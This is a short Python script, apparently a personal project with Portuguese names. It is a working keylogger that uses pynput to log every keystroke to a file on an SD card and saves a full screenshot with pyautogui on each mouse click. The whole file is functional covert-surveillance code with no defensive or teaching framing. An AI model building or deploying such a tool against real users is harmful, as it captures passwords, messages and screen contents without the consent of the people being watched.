from pynput.mouse import Listener as listaMouser
from pynput.keyboard import Listener as listaTeclado
from datetime import datetime as datahora
import re as regetes, os as sistema , pyautogui as printTela

dataAtualSistema = datahora.now()
data = dataAtualSistema.strftime("%d-%m")
pastaRaiz = "/media/wilson/SD_CARD/videoKeylogger/videoKeylogger_" + data + "/"
arquivodeLog = pastaRaiz + "keyLogger.log"

def arquivoLog():
    try:
        sistema.mkdir(pastaRaiz)
    except:
        pass #ingnora

def pressionarTeclado(tecladoPressionado):
    teclado = str(tecladoPressionado)
    teclado = regetes.sub(r'\'','', teclado)
    teclado = regetes.sub(r'Key.space', ' ', teclado)
    teclado = regetes.sub(r'Key.enter', '\n', teclado)
    teclado = regetes.sub(r'Key.tab', '   ',teclado)
    teclado = regetes.sub(r'Key.backspace', 'apagar',teclado)
    teclado = regetes.sub(r'Key.*', '', teclado)
    
    with open(arquivodeLog, 'a') as log:
        if str(teclado)==str("apagar"):
            if sistema.stat(arquivodeLog).st_size != 0:
                teclado =  regetes.sub(r'Key.backspace','',teclado)
                log.seek(0,2)
                ponteiroCaractere = log.tell()
                log.truncate(ponteiroCaractere -1)
        else:
            log.write(teclado)


def tirarPrint(x,y, botao, pressionado):
    if pressionado:
        print(f"O Mouse clicou em {x}, {y} com {botao}")
        capturaDeTela = printTela.screenshot()
        horario = datahora.now()
        horarioCaptura = str(horario.strftime("%H-%M-%S"))
        print(horarioCaptura)
        capturaDeTela.save(sistema.path.join(pastaRaiz, "capturaDeTela_" + horarioCaptura + ".jpg"))


def run():
    arquivoLog()
    
    tecladoLista = listaTeclado(on_press=pressionarTeclado)
    mouseListar = listaMouser(on_click=tirarPrint)

    tecladoLista.start()
    mouseListar.start()
    tecladoLista.join()
    mouseListar.join()
    mouseListar.stop

if __name__ == '__main__':
    run()